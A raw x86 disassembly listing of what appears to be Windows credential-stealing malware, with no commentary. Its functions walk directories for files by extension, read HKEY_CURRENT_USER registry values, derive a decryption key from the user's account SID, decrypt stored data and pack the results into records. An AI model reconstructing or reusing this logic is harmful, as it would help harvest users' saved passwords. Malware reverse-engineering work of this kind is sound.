lea eax [ esi + 0x2c ]
push eax
lea eax [ esp + 0xc ]
push eax
call [ PathAppendW@IAT ]
push r--data
lea eax [ esp + 0xc ]
push eax
call [ PathFindExtensionW@IAT ]
push eax
call [ lstrcmpiW@IAT ]
test eax eax
jne r-xdata
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn
push eax
lea eax [ esp + 0xc ]
push eax
mov eax esi
call sub_407e71
pop ecx
pop ecx
mov ebx eax
mov esi rw-data
call sub_409545
test al al
je r-xdata
lea eax [ esp + 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_40dfd9
pop ecx
pop ecx
test al al
je r-xdata
mov eax esi
call sub_401872
sub_40e12d
push ebp
mov ebp esp
mov eax 0x1450
call sub_419050
push esi
push edi
push [ ebp + 0xc ]
lea eax [ ebp - 0x1450 ]
push eax
call [ lstrcpyW@IAT ]
mov eax [ ebp + 0x10 ]
mov edi [ PathAppendW@IAT ]
add eax 0x2c
push eax
lea eax [ ebp - 0x1450 ]
push eax
call edi
mov esi [ ebp + 0x8 ]
call sub_4066e2
cmp eax 0x3
lea eax [ ebp - 0x1450 ]
jge r-xdata
push r--data
push r--data
jmp r-xdata
push eax
call edi
push 0x0
push sub_40e09f
push 0x0
push 0x1
push 0x1
lea edx [ ebp - 0x1450 ]
mov ecx esi
call sub_404959
pop edi
mov al 0x1
pop esi
leave
retn
sub_40e1a4
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41ddd3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax 0x1b0c
call sub_419050
push ebx
push esi
push edi
push 0x80051a85
push [ ebp + 0x8 ]
mov eax 0x80c61103
lea ecx [ esp + 0x268 ]
call sub_406b4c
and [ esp + 0x1b24 ] 0x0
mov edi rw-data
mov esi edi
call sub_405f3e
lea esi [ esp + 0x260 ]
call sub_406c79
test al al
je r-xdata
or [ esp + 0x1b24 ] 0xffffffff
lea eax [ esp + 0x260 ]
call sub_406c46
mov ecx [ esp + 0x1b1c ]
pop edi
pop esi
mov al 0x1
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov eax edi
mov ebx esi
call sub_406f26
lea edi [ esp + 0x6c8 ]
call sub_40956d
test al al
je r-xdata
mov edx rw-data
lea ecx [ esp + 0x260 ]
call sub_406e3e
lea edi [ esp + 0x260 ]
call sub_406db6
mov eax edi
test eax eax
je r-xdata
xor eax eax
cmp eax sub_40e12d
je r-xdata
mov eax edi
push eax
lea eax [ esp + 0x4c4 ]
push eax
call [ lstrcpyW@IAT ]
mov eax edi
push eax
call [ GetFileAttributesW@IAT ]
cmp eax 0xffffffff
je r-xdata
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x4c4 ]
push eax
call [ FindFirstFileW@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
test al 0x10
je r-xdata
mov esi [ lstrcmpW@IAT ]
push r--data
lea eax [ esp + 0x4c4 ]
push eax
call [ lstrcatW@IAT ]
push 0x0
call [ Sleep@IAT ]
push r--data
lea eax [ esp + 0x40 ]
push eax
call esi
test eax eax
je r-xdata
test [ esp + 0x10 ] 0x10
je r-xdata
push edi
call [ FindClose@IAT ]
lea eax [ esp + 0x10 ]
push eax
push edi
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ esp + 0x40 ]
push eax
call esi
test eax eax
je r-xdata
push 0x0
lea eax [ esp + 0x14 ]
push eax
lea eax [ esp + 0x6d0 ]
push eax
push [ ebp + 0x8 ]
call sub_40e12d
add esp 0x10
test al al
je r-xdata
sub_40e344
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41dc6f
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x48
push ebx
push esi
push edi
lea esi [ esp + 0x40 ]
call sub_405d11
xor edi edi
mov [ esp + 0x5c ] edi
push r--data
mov [ esp + 0x28 ] edi
mov [ esp + 0x1c ] edi
mov [ esp + 0x14 ] edi
mov [ esp + 0x38 ] edi
call sub_4046cc
mov ebx r--data
mov ecx eax
call sub_4010c5
push r--data
mov [ rw-data ] eax
call sub_4046cc
mov ecx eax
call sub_4010c5
push r--data
mov [ rw-data ] eax
call sub_4046cc
mov ecx eax
call sub_4010c5
push r--data
mov [ rw-data ] eax
call sub_4046cc
mov ecx eax
call sub_4010c5
push r--data
mov [ rw-data ] eax
call sub_4046cc
mov ecx eax
call sub_4010c5
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp eax edi
je r-xdata
or [ esp + 0x5c ] 0xffffffff
lea esi [ esp + 0x40 ]
call sub_405f2c
xor al al
cmp [ rw-data ] edi
je r-xdata
cmp [ rw-data ] edi
je r-xdata
cmp [ rw-data ] edi
je r-xdata
lea ecx [ esp + 0x10 ]
push ecx
lea ecx [ esp + 0x38 ]
push ecx
push edi
push 0x2
call eax
cmp eax edi
jne r-xdata
lea eax [ esp + 0x24 ]
push eax
push edi
push [ esp + 0x18 ]
call [ rw-data ]
cmp eax edi
jne r-xdata
push edi
push [ esp + 0x14 ]
call [ rw-data ]
or [ esp + 0x5c ] 0xffffffff
lea esi [ esp + 0x40 ]
call sub_405f2c
mov al 0x1
jmp r-xdata
mov eax [ esp + 0x24 ]
mov [ esp + 0x28 ] edi
cmp [ eax ] edi
jbe r-xdata
mov ecx [ esp + 0x54 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov [ esp + 0x20 ] edi
inc [ esp + 0x28 ]
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x28 ]
add [ esp + 0x20 ] 0x214
cmp ecx [ eax ]
jb r-xdata
mov eax [ esp + 0x18 ]
mov [ esp + 0x1c ] edi
cmp [ eax ] edi
jbe r-xdata
mov ecx [ esp + 0x20 ]
lea eax [ ecx + eax + 0x8 ]
lea ecx [ esp + 0x18 ]
push ecx
push edi
push eax
push [ esp + 0x1c ]
mov [ esp + 0x48 ] eax
call [ rw-data ]
cmp eax edi
jne r-xdata
mov [ esp + 0x14 ] edi
lea eax [ esp + 0x2c ]
push eax
lea esi [ ebx + 0x200 ]
push esi
lea eax [ esp + 0x38 ]
push eax
push edi
push ebx
push [ esp + 0x4c ]
push [ esp + 0x28 ]
call [ rw-data ]
cmp eax edi
jne r-xdata
or [ ebx + 0x200 ] 0x4
inc [ esp + 0x1c ]
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x1c ]
add [ esp + 0x14 ] 0x204
cmp ecx [ eax ]
jb r-xdata
mov eax [ esi ]
mov [ esp + 0x3c ] eax
push edi
lea eax [ esp + 0x40 ]
push eax
push 0x4
pop eax
lea ecx [ esp + 0x48 ]
call sub_4060be
mov eax [ esp + 0x2c ]
mov [ esp + 0x3c ] eax
push edi
lea eax [ esp + 0x40 ]
push eax
push 0x4
pop eax
lea ecx [ esp + 0x48 ]
call sub_4060be
push 0x1
push [ esp + 0x34 ]
lea eax [ esp + 0x48 ]
push eax
call sub_406135
push [ esp + 0x44 ]
mov esi [ ebp + 0x8 ]
push edi
push 0x64
push esi
call sub_403aef
push eax
push 0x80399101
push [ esp + 0x58 ]
push [ esp + 0x58 ]
call sub_40242d
mov ecx [ esp + 0x14 ]
mov esi [ ebp + 0x8 ]
lea ebx [ ecx + eax + 0x8 ]
mov [ esp + 0x30 ] edi
mov [ esp + 0x2c ] edi
call sub_4066e2
cmp eax 0x5
jl r-xdata
sub_40e5c9
push ebp
mov ebp esp
sub esp 0x924
push ebx
push esi
push edi
call sub_4046cc
xor esi esi
cmp [ ebp + 0x8 ] esi
je r-xdata
mov al 0x1
push esi
push [ ebp + 0x8 ]
call sub_4047b2
mov [ ebp + 0x8 ] eax
cmp eax 0xffffffff
je r-xdata
mov edi [ SetFilePointer@IAT ]
call sub_4046cc
push [ ebp + 0x8 ]
call [ CloseHandle@IAT ]
push esi
lea eax [ ebp - 0xc ]
push eax
push 0x800
lea eax [ ebp - 0x920 ]
push eax
push [ ebp + 0x8 ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov ebx [ ebp - 0xc ]
cmp ebx esi
je r-xdata
lea eax [ ebx - 0x4 ]
mov [ ebp - 0x4 ] esi
cmp eax esi
jbe r-xdata
call sub_4046cc
lea eax [ ebp - 0x920 ]
mov [ ebp - 0xc ] esi
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp + eax - 0x920 ] 0x1
jne r-xdata
inc [ ebp - 0x4 ]
lea eax [ ebx - 0x4 ]
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_4046cc
push 0x1
push esi
push esi
push [ ebp + 0x8 ]
call edi
mov [ ebp - 0x8 ] eax
cmp eax 0xffffffff
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] eax
call [ GetLastError@IAT ]
test eax eax
je r-xdata
xor al al
jmp r-xdata
push esi
lea eax [ ebp - 0x10 ]
push eax
push 0x100
lea eax [ ebp - 0x120 ]
push eax
push [ ebp + 0x8 ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ebx [ ebp - 0x10 ]
cmp ebx esi
je r-xdata
call sub_4046cc
mov eax [ ebp - 0x8 ]
push esi
sub eax ebx
add eax [ ebp - 0x4 ]
push esi
push eax
push [ ebp + 0x8 ]
call edi
call sub_4046cc
lea eax [ ebp - 0x120 ]
mov [ ebp - 0x10 ] esi
test eax eax
je r-xdata
lea eax [ ebp - 0x120 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push esi
push esi
push esi
push esi
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x20 ] ebx
call [ rw-data ]
test eax eax
je r-xdata
call sub_4046cc
push esi
push esi
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call edi
mov ebx [ ebp - 0xc ]
mov eax 0x80
cmp ebx eax
jbe r-xdata
xor ecx ecx
mov eax 0x811c9dc5
cmp ebx esi
jle r-xdata
mov ebx eax
mov ecx [ ebp + 0xc ]
imul eax eax 0x1000193
push eax
call sub_406161
call sub_4046cc
push 0x1
push esi
push esi
push [ ebp + 0x8 ]
call edi
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
movzx edx [ ebp + ecx - 0x120 ]
xor eax edx
imul eax eax 0x1000193
inc ecx
cmp ecx ebx
jl r-xdata
mov eax ebx
call [ GetLastError@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
sub eax [ ebp - 0x10 ]
mov ecx [ ebp + 0xc ]
push eax
call sub_406161
push [ ebp - 0x18 ]
mov ecx [ ebp + 0xc ]
call sub_406161
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0xc ]
push esi
push [ ebp - 0x14 ]
call sub_4060be
push [ ebp - 0x14 ]
call [ LocalFree@IAT ]
sub_40e7d6
mov eax sub_41dd34
call sub_4198ec
sub esp 0x46c
push ebx
push esi
push edi
xor eax eax
push 0x206
push eax
mov [ ebp - 0x228 ] ax
lea eax [ ebp - 0x226 ]
push eax
call sub_4130d0
add esp 0xc
lea eax [ ebp - 0x478 ]
push eax
push [ ebp + 0x8 ]
call [ FindFirstFileW@IAT ]
cmp eax 0xffffffff
jne r-xdata
push eax
call [ FindClose@IAT ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x228 ]
push eax
call [ lstrcpyW@IAT ]
lea eax [ ebp - 0x228 ]
push eax
call [ PathRemoveFileSpecW@IAT ]
lea eax [ ebp - 0x228 ]
push 0x0
push eax
lea eax [ ebp - 0x478 ]
call sub_407e71
pop ecx
mov edi rw-data
pop ecx
mov ebx eax
mov esi edi
call sub_409545
test al al
je r-xdata
xor al al
jmp r-xdata
lea esi [ ebp - 0x1c ]
call sub_405d11
xor esi esi
mov [ ebp - 0x4 ] esi
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x8 ]
call sub_40e5c9
pop ecx
pop ecx
cmp [ ebp - 0x18 ] esi
jle r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x1c ]
call sub_405f2c
mov al 0x1
push esi
push esi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x478 ]
push eax
push [ ebp + 0x8 ]
push 0x80a5f802
push 0x80a5f801
call sub_4046cc
push eax
call sub_40541b
test al al
je r-xdata
call sub_4046cc
mov eax edi
call sub_401872
sub_40e8e1
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x20c
push ebx
mov ebx [ lstrcpyW@IAT ]
push esi
push edi
push [ ebp + 0xc ]
lea eax [ esp + 0x14 ]
push eax
call ebx
mov eax [ ebp + 0x10 ]
mov edi [ PathAppendW@IAT ]
add eax 0x2c
push eax
lea eax [ esp + 0x14 ]
push eax
call edi
mov esi [ ebp + 0x8 ]
call sub_4066e2
cmp eax 0x3
lea eax [ esp + 0x10 ]
jge r-xdata
push r--data
push r--data
jmp r-xdata
push [ esi + rw-data ]
push edi
call ebx
lea eax [ esp + 0x10 ]
push eax
call sub_40e7d6
add esi 0x4
pop ecx
cmp esi 0x8
jb r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn
push eax
call edi
push r--data
lea eax [ esp + 0x14 ]
push eax
call edi
lea eax [ esp + 0x10 ]
push eax
call [ lstrlenW@IAT ]
lea edi [ esp + eax * 2 + 0x10 ]
xor esi esi
sub_40e976
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41dd81
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8c8
push ebx
push esi
push edi
push 0xffffffff
push [ ebp + 0x8 ]
mov eax 0x80a5f801
lea ecx [ esp + 0x470 ]
call sub_406b4c
and [ esp + 0x8dc ] 0x0
mov edi rw-data
mov esi edi
call sub_405f3e
lea esi [ esp + 0x468 ]
call sub_406c79
test al al
je r-xdata
or [ esp + 0x8dc ] 0xffffffff
lea eax [ esp + 0x468 ]
call sub_406c46
mov ecx [ esp + 0x8d4 ]
pop edi
pop esi
mov al 0x1
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov eax edi
mov ebx esi
call sub_406f26
lea edi [ esp + 0x260 ]
call sub_40956d
test al al
je r-xdata
mov edx rw-data
lea ecx [ esp + 0x468 ]
call sub_406e3e
lea edi [ esp + 0x468 ]
call sub_406db6
mov eax edi
test eax eax
je r-xdata
xor eax eax
cmp eax sub_40e8e1
je r-xdata
mov eax edi
push eax
lea eax [ esp + 0x6cc ]
push eax
call [ lstrcpyW@IAT ]
mov eax edi
push eax
call [ GetFileAttributesW@IAT ]
cmp eax 0xffffffff
je r-xdata
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x6cc ]
push eax
call [ FindFirstFileW@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
test al 0x10
je r-xdata
mov esi [ lstrcmpW@IAT ]
push r--data
lea eax [ esp + 0x6cc ]
push eax
call [ lstrcatW@IAT ]
push 0x0
call [ Sleep@IAT ]
push r--data
lea eax [ esp + 0x40 ]
push eax
call esi
test eax eax
je r-xdata
test [ esp + 0x10 ] 0x10
je r-xdata
push edi
call [ FindClose@IAT ]
lea eax [ esp + 0x10 ]
push eax
push edi
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ esp + 0x40 ]
push eax
call esi
test eax eax
je r-xdata
push 0x0
lea eax [ esp + 0x14 ]
push eax
lea eax [ esp + 0x268 ]
push eax
push [ ebp + 0x8 ]
call sub_40e8e1
add esp 0x10
test al al
je r-xdata
sub_40eb0e
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41dc99
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax 0x402c
call sub_419050
mov eax 0x1000
push ebx
push esi
mov [ esp + 0x28 ] eax
mov [ esp + 0x1c ] eax
mov [ esp + 0x8 ] eax
xor eax eax
mov esi r--data
push edi
cmp eax esi
je r-xdata
xor al al
lea eax [ esp + 0x1038 ]
push eax
push r--data
push esi
push 0x80000001
lea edi [ esp + 0x3c ]
call sub_4068cf
xor ebx ebx
cmp al bl
je r-xdata
lea eax [ esp + 0x2038 ]
push eax
push r--data
push esi
push 0x80000001
lea edi [ esp + 0x30 ]
call sub_4068cf
cmp al bl
je r-xdata
lea eax [ esp + 0x38 ]
push eax
push r--data
push esi
push 0x80000001
lea edi [ esp + 0x1c ]
call sub_4068cf
cmp al bl
je r-xdata
mov eax [ esp + 0x20 ]
mov [ esp + 0x30 ] eax
lea eax [ esp + 0x2038 ]
mov [ esp + 0x34 ] eax
lea eax [ esp + 0x24 ]
push eax
push 0x1
push ebx
push ebx
push ebx
push ebx
lea eax [ esp + 0x48 ]
push eax
call [ rw-data ]
test eax eax
je r-xdata
push [ esp + 0x24 ]
lea eax [ esp + 0x303c ]
push [ esp + 0x2c ]
push eax
call sub_413290
add esp 0xc
push [ esp + 0x28 ]
call [ LocalFree@IAT ]
lea esi [ esp + 0x10 ]
call sub_405d11
mov [ esp + 0x4044 ] ebx
push ebx
lea eax [ esp + 0x10 ]
push eax
push 0x4
pop edi
mov eax edi
mov ecx esi
mov [ esp + 0x14 ] 0x77010101
call sub_4060be
push r--data
mov eax esi
push eax
call sub_4025f0
lea eax [ esp + 0x38 ]
push eax
mov eax esi
push eax
call sub_4025f0
mov esi r--data
push esi
lea eax [ esp + 0x14 ]
push eax
call sub_4025f0
lea eax [ esp + 0x1038 ]
push eax
lea eax [ esp + 0x14 ]
push eax
call sub_4025f0
lea eax [ esp + 0x3038 ]
push eax
lea eax [ esp + 0x14 ]
push eax
call sub_4025f0
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax edi
lea ecx [ esp + 0x18 ]
mov [ esp + 0x14 ] ebx
call sub_4060be
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax edi
lea ecx [ esp + 0x18 ]
mov [ esp + 0x14 ] ebx
call sub_4060be
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax edi
lea ecx [ esp + 0x18 ]
mov [ esp + 0x14 ] ebx
call sub_4060be
call [ GetACP@IAT ]
mov [ esp + 0xc ] eax
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax edi
lea ecx [ esp + 0x18 ]
call sub_4060be
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax edi
lea ecx [ esp + 0x18 ]
mov [ esp + 0x14 ] 0x3
call sub_4060be
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax edi
lea ecx [ esp + 0x18 ]
mov [ esp + 0x14 ] ebx
call sub_4060be
push esi
lea eax [ esp + 0x14 ]
push eax
call sub_4025f0
mov eax [ esp + 0x14 ]
mov [ esp + 0xc ] eax
lea eax [ esp + 0xc ]
push eax
lea eax [ esp + 0x14 ]
call sub_406173
push [ esp + 0x14 ]
mov esi [ ebp + 0x8 ]
push ebx
push 0x64
push esi
call sub_403aef
push eax
push 0xff0f8211
push [ esp + 0x28 ]
push [ esp + 0x28 ]
call sub_40242d
or [ esp + 0x4044 ] 0xffffffff
lea esi [ esp + 0x10 ]
call sub_405f2c
mov al 0x1
jmp r-xdata
mov ecx [ esp + 0x403c ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
sub_40ed85
push ebp
mov ebp esp
sub esp 0xa44
push ebx
mov eax 0x200
push esi
push edi
mov [ ebp - 0x1c ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x640 ]
xor edi edi
push eax
lea esi [ ebp - 0x1c ]
mov [ ebp - 0x10 ] edi
call sub_406850
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x440 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x240 ]
push eax
push [ ebp - 0x640 ]
push edi
call [ LookupAccountSidA@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
leave
retn
push 0x10
lea eax [ ebp - 0x3c ]
push r--data
push eax
mov esi 0xba0da71d
call sub_413290
mov edx [ ebp - 0xc ]
add esp 0xc
xor ecx ecx
cmp edx edi
jbe r-xdata
mov eax [ ebp - 0x4 ]
cmp eax edi
jbe r-xdata
movsx ebx [ ebp + ecx - 0x240 ]
imul ebx esi
imul esi esi 0xbc8f
mov eax ecx
and eax 0x3
lea eax [ ebp + eax * 4 - 0x3c ]
xor [ eax ] ebx
inc ecx
cmp ecx edx
jb r-xdata
mov al [ ebp - 0x3c ]
mov ecx [ ebp + 0x8 ]
or al 0x1
lea esi [ ebp - 0xa40 ]
xor edx edx
lea ecx [ ebp - 0x440 ]
sub ecx edx
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0xa40 ]
sub esi eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push edi
push edi
lea eax [ ebp - 0x2c ]
push eax
push edi
lea eax [ ebp - 0x24 ]
push eax
mov [ ebp - 0x2c ] 0x10
mov [ ebp - 0x24 ] esi
call [ rw-data ]
test eax eax
je r-xdata
add ecx 0x2
inc edx
cmp edx 0x4
jl r-xdata
movsx ebx [ ecx + edx ]
imul ebx esi
imul esi esi 0xbc8f
mov eax edx
and eax 0x3
lea eax [ ebp + eax * 4 - 0x3c ]
xor [ eax ] ebx
inc edx
dec [ ebp - 0x8 ]
jne r-xdata
mov esi [ ebp + 0xc ]
push 0xfff
push esi
push [ ebp - 0x18 ]
push [ ebp - 0x14 ]
push edi
push edi
call [ MultiByteToWideChar@IAT ]
push [ ebp - 0x14 ]
xor ecx ecx
mov [ ebp - 0x10 ] eax
mov [ esi + eax * 2 ] cx
call [ LocalFree@IAT ]
cmp [ ecx ] di
je r-xdata
jmp r-xdata
cmp [ ecx ] di
jne r-xdata
cmp [ ecx + 0x2 ] di
je r-xdata
lea edx [ ebp - 0x640 ]
cmp esi edx
jae r-xdata
mov dl [ ecx ]
mov bl [ ecx + 0x2 ]
dec dl
shl dl 0x4
sub bl 0x21
or dl bl
sub dl al
mov [ esi ] dl
mov dl 0xf5
inc esi
add ecx 0x4
imul dl
sub_40ef0b
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41dc84
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax 0x301c
call sub_419050
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax 0x1000
xor ebx ebx
push edi
mov [ esp + 0x24 ] eax
mov [ esp + 0x10 ] eax
cmp esi ebx
je r-xdata
mov ecx [ esp + 0x302c ]
pop edi
pop esi
mov al 0x1
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ esp + 0x1028 ]
push eax
push r--data
push esi
push 0x80000001
lea edi [ esp + 0x34 ]
call sub_4068cf
cmp al bl
je r-xdata
lea eax [ esp + 0x28 ]
push eax
push r--data
push esi
push 0x80000001
lea edi [ esp + 0x20 ]
call sub_4068cf
cmp al bl
jne r-xdata
lea eax [ esp + 0x2028 ]
push eax
lea eax [ esp + 0x102c ]
push eax
call sub_40ed85
pop ecx
pop ecx
test eax eax
jle r-xdata
xor eax eax
mov [ esp + 0x28 ] ax
push esi
call [ lstrlenW@IAT ]
lea eax [ esi + eax * 2 + 0x2 ]
lea esi [ esp + 0x14 ]
mov [ esp + 0x24 ] eax
call sub_405d11
mov [ esp + 0x3034 ] ebx
push ebx
lea eax [ esp + 0x14 ]
push eax
push 0x4
pop edi
mov eax edi
mov ecx esi
mov [ esp + 0x18 ] 0x77010101
call sub_4060be
push r--data
mov eax esi
push eax
call sub_4025f0
mov esi r--data
push esi
lea eax [ esp + 0x18 ]
push eax
call sub_4025f0
lea eax [ esp + 0x28 ]
push eax
lea eax [ esp + 0x18 ]
push eax
call sub_4025f0
push [ esp + 0x24 ]
lea eax [ esp + 0x18 ]
push eax
call sub_4025f0
lea eax [ esp + 0x2028 ]
push eax
lea eax [ esp + 0x18 ]
push eax
call sub_4025f0
push ebx
lea eax [ esp + 0x14 ]
push eax
mov eax edi
lea ecx [ esp + 0x1c ]
mov [ esp + 0x18 ] ebx
call sub_4060be
push ebx
lea eax [ esp + 0x14 ]
push eax
mov eax edi
lea ecx [ esp + 0x1c ]
mov [ esp + 0x18 ] ebx
call sub_4060be
push ebx
lea eax [ esp + 0x14 ]
push eax
mov eax edi
lea ecx [ esp + 0x1c ]
mov [ esp + 0x18 ] ebx
call sub_4060be
call [ GetACP@IAT ]
mov [ esp + 0x10 ] eax
push ebx
lea eax [ esp + 0x14 ]
push eax
mov eax edi
lea ecx [ esp + 0x1c ]
call sub_4060be
push ebx
lea eax [ esp + 0x14 ]
push eax
mov eax edi
lea ecx [ esp + 0x1c ]
mov [ esp + 0x18 ] 0x3
call sub_4060be
push ebx
lea eax [ esp + 0x14 ]
push eax
mov eax edi
lea ecx [ esp + 0x1c ]
mov [ esp + 0x18 ] ebx
call sub_4060be
push esi
lea eax [ esp + 0x18 ]
push eax
call sub_4025f0
mov eax [ esp + 0x18 ]
mov [ esp + 0x10 ] eax
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x18 ]
call sub_406173
push [ esp + 0x18 ]
mov esi [ ebp + 0x10 ]
push ebx
push 0x64
push esi
call sub_403aef
push eax
push 0xff0f8211
push [ esp + 0x2c ]
push [ esp + 0x2c ]
call sub_40242d
or [ esp + 0x3034 ] 0xffffffff
lea esi [ esp + 0x14 ]
call sub_405f2c
cmp eax ebx
jge r-xdata
dec eax
cmp [ esi + eax * 2 ] 0x5c
je r-xdata
sub_40f13a
push ebx
push esi
push r--data
call sub_4046cc
mov ebx r--data
mov ecx eax
call sub_4010c5
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov esi [ esp + 0xc ]
push esi
call sub_40eb0e
pop ecx
push esi
push sub_40ef0b
push 0x0
push 0x1
push r--data
mov edx 0x80000001
mov ecx esi
call sub_4069e9
mov al 0x1
xor al al
jmp r-xdata
pop esi
pop ebx
retn
sub_40f18a
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x3c
push ebx
push esi
push edi
mov esi rw-data
push esi
call sub_406650
xor ebx ebx
lea eax [ esp + 0x14 ]
push eax
push r--data
push 0x1
push ebx
push r--data
call [ CoCreateInstance@IAT ]
test eax eax
jne r-xdata
call sub_4046cc
call sub_403fca
mov [ esp + 0x18 ] eax
push ebx
lea eax [ esp + 0x1c ]
push eax
push 0x4
pop eax
mov ecx esi
call sub_4060be
inc [ rw-data ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
lea edx [ esp + 0x10 ]
push edx
push eax
call [ ecx + 0x1c ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov edi [ eax * 4 + rw-data ]
cmp edi ebx
je r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ esp + 0x10 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
jmp r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ eax ]
lea edx [ esp + 0x1c ]
push edx
lea edx [ esp + 0x24 ]
push edx
push 0x1
push eax
call [ ecx + 0xc ]
test eax eax
je r-xdata
cmp [ esp + 0x24 ] ebx
je r-xdata
cmp [ esp + 0x28 ] ebx
je r-xdata
call sub_4046cc
mov edi [ esp + 0x24 ]
call sub_403fca
cmp eax ebx
je r-xdata
push [ esp + 0x28 ]
call [ CoTaskMemFree@IAT ]
push [ esp + 0x24 ]
call [ CoTaskMemFree@IAT ]
mov [ esp + 0x18 ] eax
push ebx
lea eax [ esp + 0x1c ]
push eax
push 0x4
pop eax
mov ecx esi
call sub_4060be
sub_40f297
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41dc6f
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x48
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
push eax
mov [ esp + 0x40 ] eax
call [ lstrlenW@IAT ]
lea eax [ eax + eax + 0x2 ]
mov [ esp + 0x38 ] eax
lea eax [ esp + 0x30 ]
push eax
push 0x1
xor ebx ebx
push ebx
push ebx
lea eax [ esp + 0x48 ]
push eax
push ebx
push [ ebp + 0xc ]
call [ rw-data ]
test eax eax
je r-xdata
xor al al
mov eax [ esp + 0x34 ]
cmp eax ebx
je r-xdata
cmp [ eax + 0xc ] 0x4b434957
jne r-xdata
mov edi [ eax ]
mov ecx [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
add ecx edi
add ecx edx
cmp [ esp + 0x30 ] ecx
jb r-xdata
push eax
call [ LocalFree@IAT ]
mov al 0x1
jmp r-xdata
add edi edx
lea edx [ eax + 0x14 ]
add edi eax
test [ edx ] 0xfffffffe
lea ecx [ eax + 0x24 ]
mov [ esp + 0x18 ] edi
mov [ esp + 0xc ] ebx
mov [ esp + 0x2c ] edx
jbe r-xdata
mov ecx [ esp + 0x54 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
